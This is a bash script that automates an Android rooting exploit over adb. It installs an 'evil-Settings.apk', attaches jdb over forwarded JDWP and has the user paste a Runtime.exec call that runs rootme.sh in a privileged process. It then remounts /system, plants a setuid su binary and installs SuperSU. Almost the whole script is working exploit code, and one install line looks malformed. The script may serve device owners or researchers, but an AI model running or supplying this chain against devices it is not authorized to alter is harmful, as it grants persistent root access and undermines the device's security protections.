#!/bin/bash
set -e

function adb_reboot()
{
	echo "Press ENTER to reboot phone"
	read
	adb reboot
	echo "Waiting for device..."
	adb wait-for-device
}

if [ ! "$1" ] ; then
	echo "Usage: $0 <sdk directory>" >&2
	exit 1
fi

SDK="$1"
MAKE=$(which gmake || which make)

export PATH=${SDK}/platform-tools:${SDK}/build-tools/17.0.0:$PATH

which adb aapt jdb unzip python ${MAKE}

${MAKE} SDK=${SDK}

# First to get root in ADB shell
adb push rootme.sh /sdcard/rootme.sh
adb install evil-Settings.apk
adb shell am start -D -a android.intent.action.MAIN -n a.b.c.d/android.app.Activity
adb forward tcp:8600 jdwp:$(adb jdwp)

cat << EOF

STARTING DEBUGGER!!

When you see the debugger prompt (>), paste the following command:

	stop in android.os.MessageQueue.next()

then tap the screen in your device and go back to this terminal. You should see the "Breakpoint hit" message, and then a different prompt (<1> main[1]). Then paste the following command:

	print java.lang.Runtime.getRuntime().exec("/system/bin/sh /sdcard/rootme.sh")

wait a few seconds until you see the command output, and the "<1> main[1]" prompt is displayed back at you. Then type:

	exit

EOF

jdb -attach localhost:8600

adb_reboot

# Second, install Supersu rootkit
system_dev=$(adb shell mount | grep " /system " | cut -d ' ' -f 1)
adb shell mount -o remount,rw ${system_dev} /system
adb push su /system/xbin
adb shell chmod 6755 /system/xbin/su
adb shell install Supersu.apk
adb shell rm /data/local.prop

adb_reboot

${MAKE} clean

echo "Done!"

exit 0
